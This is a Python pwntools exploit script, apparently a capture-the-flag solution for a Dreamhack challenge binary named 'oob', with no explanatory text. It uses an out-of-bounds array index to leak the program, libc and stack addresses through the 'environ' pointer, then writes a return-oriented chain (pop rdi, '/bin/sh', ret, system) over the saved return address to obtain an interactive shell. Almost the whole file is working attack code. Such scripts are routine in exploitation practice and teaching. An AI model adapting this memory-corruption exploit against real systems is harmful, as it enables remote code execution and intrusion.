#!/usr/bin/env python3
from pwn import *
exe = ELF('oob_patched', checksec = False)
libc = ELF('libc.so.6', checksec=False)

# p = process(exe.path)
# p = remote('host8.dreamhack.games', 14565)
p = remote('localhost', 9090)

def read_data(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', idx)

def write_data(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', idx)
    p.sendlineafter(b': ', data)


# input()
leak = b''
for i in range(-8, 0):
    read_data(str(i).encode())
    leak += p.recv(1)

#stage 1 leak exe and libc
exe_leak = u64(leak)
exe.address = exe_leak - 0x4008
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

leak = b''
for i in range(16, 22):
    read_data(str(i).encode())
    leak += p.recvn(1)

libc_leak = u64(leak + b'\0\0')
libc.address = libc_leak - libc.sym['_IO_2_1_stdout_']
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

#stage 2 leak stack
# print(hex(libc.sym['environ']))
# print(hex(exe.sym['oob']))
environToOob = libc.sym['environ'] - exe.sym['oob']

leak = b''
for i in range(environToOob, environToOob + 8):
    read_data(str(i).encode())
    leak += p.recv(1)

stack_leak = u64(leak)
log.info("stack leak: " + hex(stack_leak))

#stage 3 return address overwrite
pop_rdi = 0x2a3e5 + libc.address
binsh = 0x1d8698 + libc.address
ret = 0xbab79 + libc.address
oob2rip = stack_leak - 0x120 - exe.sym['oob']

print(hex(pop_rdi))
print(hex(binsh))
print(hex(ret))
print(hex(oob2rip))

write_data(str(oob2rip).encode(), str(pop_rdi).encode())
write_data(str(oob2rip + 8).encode(), str(binsh).encode())
write_data(str(oob2rip + 16).encode(), str(ret).encode())
write_data(str(oob2rip + 24).encode(), str(libc.sym.system).encode())

p.sendlineafter(b'> ', b'3')


p.interactive()
